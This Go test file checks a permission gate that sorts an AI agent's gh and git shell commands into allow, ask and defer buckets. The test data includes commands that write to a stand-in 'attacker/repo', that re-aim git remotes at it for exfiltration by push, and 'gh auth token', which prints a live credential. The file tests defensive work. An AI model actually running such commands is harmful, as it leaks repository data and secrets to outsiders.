package main

import (
	"os/exec"
	"testing"
)

// Coverage for the gh ALLOW floor being replaced by ALLOW-by-enumeration
// (recognized reads + an enumerated recoverable-own-repo-write verb set);
// unrecognized gh noun/verb ASKs (fail-closed); an enumerated write to a
// FOREIGN repo ASKs (exfil-by-write scoping); and `git remote add`/`set-url`
// ASKs (the git version of the same channel).

// setupRepoWithOrigin creates a real git repo whose `origin` remote points at
// the given owner/repo, so sessionOriginRepo can resolve the session repo.
func setupRepoWithOrigin(t *testing.T, dir, ownerRepo string) {
	t.Helper()
	gitInit(t, dir)
	cmd := exec.Command("git", "-C", dir, "remote", "add", "origin",
		"git@github.com:"+ownerRepo+".git")
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("set origin: %v\n%s", err, out)
	}
}

// classifyInRepo classifies a command with the event cwd set to a real repo, so
// origin-aware scoping can run its `git remote get-url origin`.
func classifyInRepo(t *testing.T, cmd, repoDir string) Decision {
	t.Helper()
	ev := &Event{HookEventName: "PreToolUse", ToolName: "Bash", CWD: repoDir, AgentType: "main"}
	return classifyBash(cmd, ev)
}

// --- gh ALLOW-by-enumeration; unrecognized ASKs ------------------------------

func TestGhEnumeratedRecoverableWriteAllow_163(t *testing.T) {
	// The sanctioned hot-loop write verbs ALLOW (own repo, no explicit target).
	for _, cmd := range []string{
		"gh pr create --fill",
		"gh pr comment 5 --body hi",
		"gh pr merge 7 --squash",
		"gh pr close 5",
		"gh pr ready 5",
		"gh pr reopen 5",
		"gh issue create --title t --body b",
		"gh issue comment 5 --body hi",
		"gh issue close 5",
		"gh issue edit 5 --add-label bug",
		"gh issue reopen 5",
		"gh label create urgent --color red",
		"gh cache delete 123",
	} {
		wantBucket(t, classifyCmd(t, cmd, false), BucketAllow, "enumerated recoverable write: "+cmd)
	}
	// The `gist` noun contributes NO row to this list: ghRecoverableWriteVerbs has
	// no `gist` entry at all, because both of its write verbs publish local
	// content to a URL outside the repo and both reach the publish ask instead
	// (#229) — `create` because a gist without `--public` is unlisted rather than
	// private, `edit` because the gist it writes into may already have readers.
	// Asserted rather than left implicit, with a real repo cwd rather than the
	// `/tmp` classifyCmd uses, so the file operand resolves inside a repo and the
	// containment tier above the publish ask does not decide the row. The REASON
	// is pinned as well, because the fail-closed floor an unenumerated verb lands
	// on is the same BUCKET as the publish ask and would make a bucket-only row
	// pass whether or not the publish arm exists.
	repo := t.TempDir()
	gitInit(t, repo)
	if _, ok := ghRecoverableWriteVerbs["gist"]; ok {
		t.Error("#229 ghRecoverableWriteVerbs must carry no `gist` entry: both its write verbs publish")
	}
	wantReason(t, classifyInRepo(t, "gh gist edit abc123 f.txt", repo), BucketAsk,
		"into a gist that ALREADY EXISTS", "gh gist edit is not an enumerated recoverable write")
}

func TestGhReadStillAllow_163(t *testing.T) {
	// Reads remain ALLOW (including secret/variable list, whose write verbs DENY).
	for _, cmd := range []string{
		"gh pr list",
		"gh issue view 1",
		"gh pr diff 5",
		"gh pr checks 5",
		"gh secret list",
		"gh variable list",
		"gh run view 9",
	} {
		wantBucket(t, classifyCmd(t, cmd, false), BucketAllow, "read still allow: "+cmd)
	}
}

func TestGhUnrecognizedFailsClosedToDefer_163(t *testing.T) {
	// The former silent ALLOW floor is gone: an unrecognized gh noun/verb —
	// which the microVM does not backstop for a credential-carrying operation —
	// withholds the ALLOW. Post-#262 the residual is DEFER: "the gate does not
	// recognize this verb" is an absence of gate knowledge, not evidence of
	// harm, and it is precisely what a context-reading evaluator grades better
	// than a prompt.
	for _, cmd := range []string{
		"gh frobnicate widget",
		"gh pr frobnicate 5",
		"gh issue frobnicate 5",
		"gh newnoun list", // unknown noun, even with a read-shaped verb
	} {
		wantReason(t, classifyCmd(t, cmd, false), BucketDefer,
			"not a recognized read", "unrecognized gh withholds the allow: "+cmd)
	}
}

// `gh auth token` prints the active GitHub OAuth/PAT token to stdout — the
// gh analog of `aws configure get aws_secret_access_key` — so it is a
// hard-ask-tier CREDENTIAL READ and keeps its human click.
//
// It gets that click from its own arm in classifyGh's `auth` switch, added in
// #262. Before then it escalated only INCIDENTALLY, by falling through to the
// unrecognized-command floor, and that floor was an ASK; when #262 moved the
// floor to DEFER, an explicit arm was the difference between the tier keeping
// this call and silently losing it. The assertion on the reason is what makes
// the distinction testable: a bucket-only check would pass again the moment
// the credential arm was deleted and the residual caught it.
func TestGhAuthTokenIsAHardAsk_262(t *testing.T) {
	for _, cmd := range []string{
		"gh auth token",
		"gh auth token --hostname github.com",
	} {
		wantReason(t, classifyCmd(t, cmd, false), BucketAsk,
			"prints the live OAuth token", "gh auth token is a credential read: "+cmd)
	}
}

// A verb explicitly mapped false in ghRecoverableWriteVerbs (issue transfer) is
// NOT an enumerated recoverable write and falls through to the residual DEFER.
func TestGhMappedFalseVerbDefers_262(t *testing.T) {
	wantBucket(t, classifyCmd(t, "gh issue transfer 5 other/repo", false), BucketDefer,
		"issue transfer (mapped false) → residual DEFER")
}

// --- foreign-target write scoping --------------------------------------------

func TestGhForeignTargetWriteDefers_262(t *testing.T) {
	repo := t.TempDir()
	setupRepoWithOrigin(t, repo, "sessionowner/sessionrepo")

	// An enumerated write whose explicit target differs from origin → DEFER
	// (#262): whether a cross-repo write is the exfil channel or ordinary work
	// on a fork is context the evaluator reads and the gate cannot. What it must
	// never be is the plain ALLOW an own-repo target earns.
	for _, cmd := range []string{
		"gh issue comment 5 -R attacker/repo --body x",
		"gh pr create -R attacker/repo --fill",
		"gh -R attacker/repo issue comment 5 --body x", // leading-global form
		"gh --repo=attacker/repo pr create --fill",     // =-joined form
		"gh -Rattacker/repo issue close 5",             // glued -R form
	} {
		wantReason(t, classifyInRepo(t, cmd, repo), BucketDefer,
			"attacker/repo", "foreign-target write: "+cmd)
	}
}

func TestGhOwnTargetWriteAllows_163(t *testing.T) {
	repo := t.TempDir()
	setupRepoWithOrigin(t, repo, "sessionowner/sessionrepo")

	// An explicit target matching origin (case-insensitively) stays ALLOW.
	for _, cmd := range []string{
		"gh pr create -R sessionowner/sessionrepo --fill",
		"gh issue comment 5 -R SessionOwner/SessionRepo --body x", // case-insensitive
		"gh issue comment 5 --body x",                             // no explicit target → own repo
	} {
		wantBucket(t, classifyInRepo(t, cmd, repo), BucketAllow, "own-target write: "+cmd)
	}
}

func TestGhForeignTargetReadStaysAllow_163(t *testing.T) {
	repo := t.TempDir()
	setupRepoWithOrigin(t, repo, "sessionowner/sessionrepo")

	// Reads are NOT foreign-target-scoped: a GET to a foreign repo is not the
	// exfil channel (that is consummated only by a write).
	for _, cmd := range []string{
		"gh issue view 1 -R attacker/repo",
		"gh pr list -R attacker/repo",
	} {
		wantBucket(t, classifyInRepo(t, cmd, repo), BucketAllow, "foreign-target read stays allow: "+cmd)
	}
}

// When origin cannot be determined, foreign-target scoping fails OPEN: the write
// already passed the recoverable-write allowlist, so the floor is the former
// ALLOW rather than a silent bypass of a deny tier.
func TestGhForeignTargetUnknownOriginAllows_163(t *testing.T) {
	repo := t.TempDir()
	gitInit(t, repo) // no origin remote configured
	wantBucket(t, classifyInRepo(t, "gh issue comment 5 -R attacker/repo --body x", repo),
		BucketAllow, "unknown origin → foreign-target scoping fails open to ALLOW")
}

// --- git remote add / set-url ------------------------------------------------

func TestGitRemoteReaimDefers_262(t *testing.T) {
	// A remote re-aim withholds git's ordinary ALLOW and DEFERS (#262), naming
	// the exfil-by-push channel in the analysis. The reason is asserted because
	// git's fall-through ALLOW and this arm are the two live outcomes here, and
	// a bucket-only check on a defer cannot tell this arm from a bare
	// deferToPipeline elsewhere in the line.
	for _, cmd := range []string{
		"git remote add evil git@github.com:attacker/repo.git",
		"git remote set-url origin git@github.com:attacker/repo.git",
		"git remote set-url --push origin git@github.com:attacker/repo.git",
	} {
		wantReason(t, classifyCmd(t, cmd, false), BucketDefer,
			"exfil-by-push", "git remote re-aim: "+cmd)
	}
}

func TestGitRemoteReadStillAllows_163(t *testing.T) {
	// A `git remote -v` / `get-url` read is not a mutation: it keeps git's
	// ordinary ALLOW rather than being caught by the re-aim arm above.
	for _, cmd := range []string{
		"git remote -v",
		"git remote get-url origin",
		"git remote show origin",
	} {
		wantBucket(t, classifyCmd(t, cmd, false), BucketAllow, "git remote read: "+cmd)
	}
}

// --- parseOwnerRepoFromRemote / normalizeRepoSlug ----------------------------

func TestParseOwnerRepoFromRemote_163(t *testing.T) {
	cases := map[string]string{
		"git@github.com:owner/repo.git":       "owner/repo",
		"git@github.com:owner/repo":           "owner/repo",
		"https://github.com/owner/repo.git":   "owner/repo",
		"https://github.com/owner/repo":       "owner/repo",
		"ssh://git@github.com/owner/repo.git": "owner/repo",
		"https://github.com/Owner/Repo.git":   "owner/repo", // lowercased
		"":                                    "",
		"not-a-url":                           "",
		"https://github.com/onlyone":          "",
	}
	for in, want := range cases {
		if got := parseOwnerRepoFromRemote(in); got != want {
			t.Errorf("parseOwnerRepoFromRemote(%q) = %q, want %q", in, got, want)
		}
	}
}
